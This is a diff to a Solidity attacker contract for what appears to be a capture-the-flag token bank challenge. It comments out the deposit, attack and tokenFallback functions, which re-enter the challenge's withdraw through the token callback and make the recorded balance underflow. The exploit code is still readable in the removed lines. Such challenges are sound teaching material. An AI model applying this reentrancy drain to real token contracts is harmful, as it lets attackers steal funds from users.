@@ -27,35 +27,35 @@ contract TokenBankAttacker {
         challenge = ITokenBankChallenge(challengeAddress);
     }
 
-    function deposit() external {
-        uint256 myBalance = challenge.token().balanceOf(address(this));
-        // deposit is handled in challenge's tokenFallback
-        challenge.token().transfer(address(challenge), myBalance);
-    }
+    // function deposit() external {
+    //     uint256 myBalance = challenge.token().balanceOf(address(this));
+    //     // deposit is handled in challenge's tokenFallback
+    //     challenge.token().transfer(address(challenge), myBalance);
+    // }
 
-    function attack() external {
-        callWithdraw();
+    // function attack() external {
+    //     callWithdraw();
 
-        console.log("attacker balance underflows : ", challenge.balanceOf(address(this)));
-        // if something went wrong, revert
-        require(challenge.isComplete(), "challenge not completed");
-    }
+    //     console.log("attacker balance underflows : ", challenge.balanceOf(address(this)));
+    //     // if something went wrong, revert
+    //     require(challenge.isComplete(), "challenge not completed");
+    // }
 
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes calldata
-    ) external {
-        require(
-            msg.sender == address(challenge.token()),
-            "not from original token"
-        );
+    // function tokenFallback(
+    //     address from,
+    //     uint256 value,
+    //     bytes calldata
+    // ) external {
+    //     require(
+    //         msg.sender == address(challenge.token()),
+    //         "not from original token"
+    //     );
 
-        // when attacker EOA deposits, ignore
-        if (from != address(challenge)) return;
+    //     // when attacker EOA deposits, ignore
+    //     if (from != address(challenge)) return;
 
-        callWithdraw();
-    }
+    //     callWithdraw();
+    // }
 
     function callWithdraw() private {
         // we are draining all the balance from the perspective 
